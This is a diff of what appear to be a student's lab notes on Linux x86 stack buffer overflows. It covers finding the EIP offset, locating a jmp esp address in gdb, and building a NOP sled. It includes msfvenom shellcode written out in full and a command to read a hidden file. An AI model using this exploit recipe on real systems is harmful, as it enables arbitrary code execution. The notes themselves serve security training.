@@ -302,13 +302,14 @@ Buffer Overflow Defenses
   >pdisass getuserinput "if somthing is in red, google and read about possible vulnerabilities from said functions"
   >run <<<$(python linex.py) ## this inputs the script into what the prompt is asking for
 ##go to https://wiremask.eu/tools/buffer-overflow-pattern-generator/       give it a 100
-## copy pattern into offset, enter, copy EIP value into wiremask to find offset value
+## make script, copy pattern into offse instead of, enter, 
+    run <<<$(python linex.py) ##copy EIP value into wiremask to find offset value
 ## change offset = "A" * 100 in script to the offset value
-## add eip ="BBB" and print (offset+eip) to script, run it to confirm eip is "BBB"                                                      eip = "BBB"
+## add eip ="BBB" and print (offset+eip) to script, run it to confirm eip is "BBB"                                                      eip = "BBBB"
 
 ## Set GDB environment and find jmp esp addresses
   >shell
-  >env -gdb ./func
+  >env - gdb ./func
     show env
     unset env COLUMNS
     unset env LINES
@@ -322,15 +323,16 @@ Buffer Overflow Defenses
 ## put into   ->                                                                                                                  eip = "\x59\x3b\xde\xf7"
 shell                                                                                                                             nop = "\x90" * 15
 >msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python
-## take al buf and put into script under nop                                                                                      buf =  b""
+## take all buf and put into script under nop                                                                                     buf =  b""
                                                                                                                                   buf += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68"
                                                                                                                                   buf += b"\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52"
                                                                                                                                   buf += b"\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00"
->run <<<$(python linex.py)                                                                                                        buf += b"\x57\x53\x89\xe1\xcd\x80"
+>./func <<<$(python linex.py)                                                                                                        buf += b"\x57\x53\x89\xe1\xcd\x80"
                                                                                                                                   print (offset+eip+nop+buf)
+                    OPNOTES
+Vulnerable functions: printf, fgets
 
-
-
+msfvenom -p linux/x86/exec CMD="cat /.hidden/inventory.exe" -b "\x00\xfe\x20\x0a\xff" -f python
 
 
 
